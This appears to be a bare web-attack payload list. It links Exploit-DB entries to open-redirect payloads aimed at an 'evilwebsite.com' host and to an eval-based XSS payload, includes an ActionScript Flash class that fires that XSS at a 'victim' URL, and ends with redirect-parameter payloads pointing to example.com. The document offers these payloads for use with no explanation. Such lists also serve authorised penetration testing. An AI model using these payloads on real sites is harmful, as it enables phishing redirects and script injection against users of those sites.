https://www.exploit-db.com/exploits/47689 --> https://redirect.local/%0a.evilwebsite.com
https://www.exploit-db.com/exploits/47688 --> http://domain.tld/%09//otherdomain.tld
https://www.exploit-db.com/exploits/31052 --> <img%20src=sa%20 onerror=eval(document.location.hash.substr(1))>#alert(123)

 public class TestXss extends flash.display.Sprite {
    public function TestXss(){
      var r:URLRequest = new URLRequest('http://victim/<img%20src=sa%20
                  onerror=eval(document.location.hash.substr(1))>#alert(123)');

      r.method = 'POST';
      r.data = unescape('test');
      r.requestHeaders.push(new URLRequestHeader('Accept', 'image/jpeg; q=0'));

      navigateToURL(r, '_self');
     
    }
    }

?authorize_callback=///example.com
?return=///example.com
?url=///example.com
?redirect=///example.com
?return_to=///example.com
?next=///example.com
?returnTo=///example.com
?returnurl=///example.com
//example.com/
?redirect_uri=///example.com
?next=///example.com
/redirect?url=///example.com
?from=%20https://example.com
?forum_reg=http://example.com/
?u=example.com
?dir=///example.com
